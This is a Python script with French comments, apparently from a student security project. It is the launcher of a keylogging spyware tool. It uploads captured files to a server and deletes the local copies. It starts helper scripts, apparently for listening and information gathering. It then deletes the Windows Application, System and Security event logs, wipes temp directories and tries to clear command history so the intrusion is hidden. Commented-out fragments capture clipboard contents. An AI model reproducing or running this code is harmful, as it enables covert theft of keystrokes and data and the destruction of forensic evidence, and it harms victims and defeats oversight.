import sys
import os
import tkinter as tk
from pynput import keyboard
from PIL import Image, ImageTk
import time
import random
import cv2
import pyautogui
from datetime import datetime
import shutil
import requests as r
import subprocess

fichier_log = "frappes_clavier.txt"
url = "http://localhost:8000"
destination_folder = r"/Users/Thomas/Documents/GitHub/ProjetSecuriteSE/"

def uploadServer(filename):
    filepath = os.path.abspath(filename)
    with open(filepath, "rb") as file:
        # Use the files parameter to send the file
        files = {"file": file}
        response = r.post(url, files=files)
    os.remove(filepath)



# Fonction pour supprimer les fichiers de logs de l'Observateur d'événements
def delete_event_logs():
    log_directories = [
        "C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
        "C:\\Windows\\System32\\winevt\\Logs\\System.evtx",
        "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx"
    ]
    
    for log_file in log_directories:
        try:
            if os.path.exists(log_file):
                os.remove(log_file)
                print(f"Log supprimé: {log_file}")
        except Exception as e:
            print(f"Erreur lors de la suppression du log {log_file}: {e}")

# Fonction pour nettoyer les fichiers temporaires et caches
def delete_temp_files():
    temp_dirs = [
        "C:\\Windows\\Temp",
        "C:\\Users\\<NomUtilisateur>\\AppData\\Local\\Temp"  # Remplacer <NomUtilisateur> par le nom réel
    ]
    
    for temp_dir in temp_dirs:
        try:
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir)  # Supprime tout le contenu du répertoire
                os.makedirs(temp_dir)  # Recréation du répertoire vide
                print(f"Dossier temporaire supprimé: {temp_dir}")
        except Exception as e:
            print(f"Erreur lors de la suppression du dossier {temp_dir}: {e}")

# Fonction pour vider l'historique des commandes PowerShell et cmd
def clear_command_history():
    try:
        # Vider l'historique de PowerShell
        os.system("Clear-History")
        # Vider l'historique de CMD (si applicable)
        os.system("cls")
        print("Historique des commandes supprimé.")
    except Exception as e:
        print(f"Erreur lors de la suppression de l'historique des commandes: {e}")     
 
#clipboard_content = get_clipboard_content()

# if len(clipboard_content) <= 12:
#     print("Contenu du presse-papiers:", clipboard_content)
#     # Stocker le contenu dans un fichier texte
#     with open("pp.txt", "w") as file:
#         file.write(clipboard_content)
#         print("Le contenu du presse-papiers a été sauvegardé dans 'presse_papiers.txt'")
# else:
#     print("Presse-papiers trop long")

############################################################

# for i in range(10):
#     time.sleep(0.1)
#     rand = random.randint(2, 76)
#     image = Image.open("chat/"+str(rand)+".png")
#     print("oui")
#     image.show()

# Exécuter la fonction
#capture_ecran_toutes_les_1_minutes()

def Main():
    subprocess.Popen(['cmd', '--', 'python3', 'listen.py'])
    subprocess.Popen(['cmd', '--', 'python3', 'info.py'])
    time.sleep(100)
    #subprocess.popup()
    subprocess.Popen(['cmd', '--', 'python3', 'Zzzz.py'])
    delete_event_logs()
    delete_temp_files()
    clear_command_history()
if __name__ == "__main__":
    Main()